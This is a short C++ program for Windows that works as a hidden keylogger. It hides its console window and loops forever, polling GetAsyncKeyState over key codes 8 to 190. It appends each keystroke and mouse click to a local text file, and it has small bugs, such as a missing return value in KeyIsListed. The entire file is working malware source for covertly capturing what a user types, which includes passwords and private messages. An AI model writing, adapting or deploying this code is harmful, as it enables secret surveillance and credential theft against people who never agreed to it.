#include <iostream>
#include <fstream>
#include <windows.h>
#include <stdio.h>
#include <string>



using namespace std;

void WriteToLog(LPCSTR text) {
	ofstream logfile; // file for stream
	logfile.open("Keylogs.txt", fstream::app); //open file
	logfile << text; //write stream
	logfile.close();

}

bool KeyIsListed(int ikey) {
	switch (ikey)
	{
	case VK_SPACE:
		//cout << " ";  //For space key
		WriteToLog(" ");
		break;
	case VK_RETURN:
		//cout << "\n";  //For return key
		WriteToLog("\n");
		break;
	case VK_SHIFT:
		//cout << "Shift";  //For shift key
		WriteToLog("Shift");
		break;
	case VK_BACK:
		//cout << "\b";  //For backspace
		WriteToLog("\b");
		break;
	case VK_RBUTTON:
		//cout << "right-click ";  //For rclick
		WriteToLog("right-click ");
		break;
	case VK_LBUTTON:
		//cout << "left-click ";  //For lclick
		WriteToLog("left-click ");
		break;
	default: return false;  //is applicable to list
	}
}

int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	char key;
	while (TRUE) {
		Sleep(10);
		for (key = 8; key <= 190; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				if (KeyIsListed(key) == FALSE) {
					//cout << key;
					ofstream logfile;  //create object to stream
					logfile.open("keylogs.txt", fstream::app);  //open to write
					logfile << key;  //write log key to char file
					logfile.close();  //close stream
				}
			}
			//If (VK_OEM_6 )
		}
	}

	return 0;

}

